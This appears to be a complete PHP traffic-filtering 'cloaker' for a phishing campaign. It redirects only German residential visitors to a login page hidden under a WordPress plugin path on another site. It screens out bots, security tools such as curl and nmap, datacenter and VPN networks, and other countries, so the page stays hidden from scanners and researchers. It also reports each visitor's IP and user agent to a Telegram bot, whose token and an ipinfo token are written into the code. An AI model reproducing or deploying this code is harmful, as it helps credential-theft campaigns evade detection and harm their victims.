<?php
// === CONFIG ===
$redirectUrl = "https://oneplusambalaj.com/wp-content/plugins/app/app/app/app/login.php/";
$allowedCountries = ['DE'];
$cookieName = 'real_browser';
$logFile = __DIR__ . '/access_redirect.log';
$banListFile = __DIR__ . '/banned_ips.txt';
$rateLimitFile = __DIR__ . '/ratelimit.json';
$ipinfoToken = "ca8b78d102f513";
$telegramBotToken = "8297252228:AAGZon56qk1D2UuguSZ4Ee5gC4oYd8Jbd7g";
$telegramChatId = "-4940908298";

// === MYSQL DB CONFIG ===
$dbHost = 'localhost';
$dbName = 'firewall_logs';
$dbUser = 'root';
$dbPass = 'password';

// === UTILITIES ===
function dbLog($ip, $reason, $ua, $country, $org) {
    global $dbHost, $dbName, $dbUser, $dbPass;
    try {
        $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
        $stmt = $pdo->prepare("INSERT INTO logs (ip, reason, ua, country, org, timestamp) VALUES (?, ?, ?, ?, ?, NOW())");
        $stmt->execute([$ip, $reason, $ua, $country, $org]);
    } catch (Exception $e) {
        // Fail silently if DB logging doesn't work
    }
}

function logAccess($ip, $reason, $ua, $country = '-', $org = '-') {
    global $logFile, $telegramBotToken, $telegramChatId, $banListFile;

    $date = date("Y-m-d H:i:s");
    $entry = "[$date] IP: $ip | Reason: $reason | UA: $ua\n";
    file_put_contents($logFile, $entry, FILE_APPEND);
    dbLog($ip, $reason, $ua, $country, $org);

    // Auto-ban on datacenter or rate abuse
    if (str_contains(strtolower($reason), 'proxy') || str_contains($reason, 'Rate limited')) {
        file_put_contents($banListFile, "$ip\n", FILE_APPEND);
    }

    $mapLink = "https://www.google.com/maps/search/?api=1&query=$ip";
    $msg = "🚨 *Access Log*\n"
         . "*IP:* `$ip`\n"
         . "*Reason:* `$reason`\n"
         . "*UA:* `$ua`\n"
         . "*Time:* $date\n"
         . "[📍 Map]($mapLink)";

    $payload = [
        'chat_id' => $telegramChatId,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];
    @file_get_contents("https://api.telegram.org/bot{$telegramBotToken}/sendMessage?" . http_build_query($payload));
}

function getIPInfo($ip) {
    global $ipinfoToken;
    $info = @json_decode(file_get_contents("https://ipinfo.io/{$ip}?token={$ipinfoToken}"), true);
    if (!$info || !isset($info['country'])) {
        $info = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,as,org"), true);
        if ($info['status'] === 'success') {
            return [
                'country' => $info['country'],
                'org' => $info['org'] ?? $info['as']
            ];
        }
    }
    return $info;
}

function checkRateLimit($ip) {
    global $rateLimitFile;
    $data = file_exists($rateLimitFile) ? json_decode(file_get_contents($rateLimitFile), true) : [];
    $now = time();
    if (!isset($data[$ip])) $data[$ip] = [];

    $data[$ip] = array_filter($data[$ip], fn($t) => $now - $t < 60);
    $data[$ip][] = $now;
    file_put_contents($rateLimitFile, json_encode($data));
    return count($data[$ip]) > 10;
}

// === START ===
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// === STEP 0: BAN LIST CHECK
$banList = file_exists($banListFile) ? file($banListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
if (in_array($ip, $banList)) {
    logAccess($ip, "Banned IP", $ua);
    http_response_code(403);
    exit("Access denied.");
}

// === STEP 1: HONEYPOT TRAP
if (isset($_GET['hp_trap'])) {
    logAccess($ip, "Honeypot triggered", $ua);
    http_response_code(403);
    exit("Go away bot.");
}

// === STEP 2: RATE LIMIT
if (checkRateLimit($ip)) {
    logAccess($ip, "Rate limited", $ua);
    http_response_code(429);
    exit("Too many requests.");
}

// === STEP 3: UA/BOT FILTER
$badUA = '/(bot|crawl|spider|wget|curl|headless|python|java|fetch|scrapy|nmap|masscan|powershell|axios|node|perl|phantom|selenium|playwright|winhttp|httpclient|libwww)/i';
if (!$ua || preg_match($badUA, $ua)) {
    logAccess($ip, "Blocked: Suspicious UA", $ua);
    http_response_code(403);
    exit("Access denied.");
}

// === STEP 4: JS/Cookie
if (!isset($_COOKIE[$cookieName])) {
    echo <<<HTML
    <html><head><script>
    document.cookie = "$cookieName=1; path=/";
    location.reload();
    </script></head><body><noscript><h1>Enable JavaScript</h1></noscript>
    <form style="display:none"><input type="text" name="hp_trap" /></form>
    </body></html>
    HTML;
    exit();
}

// === STEP 5: IP INFO
$info = getIPInfo($ip);
if (!$info || !isset($info['country'], $info['org'])) {
    logAccess($ip, "Blocked: IP info fail", $ua);
    http_response_code(403);
    exit("IP lookup failed.");
}

// === STEP 6: COUNTRY CHECK
if (!in_array($info['country'], $allowedCountries)) {
    logAccess($ip, "Blocked country: {$info['country']}", $ua, $info['country'], $info['org']);
    http_response_code(403);
    exit("Country not allowed.");
}

// === STEP 7: DC/PROXY BLOCK
$dcPatterns = '/(amazon|google|ovh|microsoft|digitalocean|hetzner|vultr|contabo|netcup|leaseweb|scaleway|linode|upcloud|oracle|kamatera|nocix|colo|datacenter|racknerd|ionos|shinjiru|ghost|serverion|alphavps|cloudflare|hostinger|vps|vpn|hosting|cdn)/i';
if (preg_match($dcPatterns, $info['org'])) {
    logAccess($ip, "Blocked proxy: {$info['org']}", $ua, $info['country'], $info['org']);
    http_response_code(403);
    exit("Proxy not allowed.");
}

// === STEP 8: REDIRECT
logAccess($ip, "Redirected", $ua, $info['country'], $info['org']);
header("Location: $redirectUrl", true, 302);
exit();
?>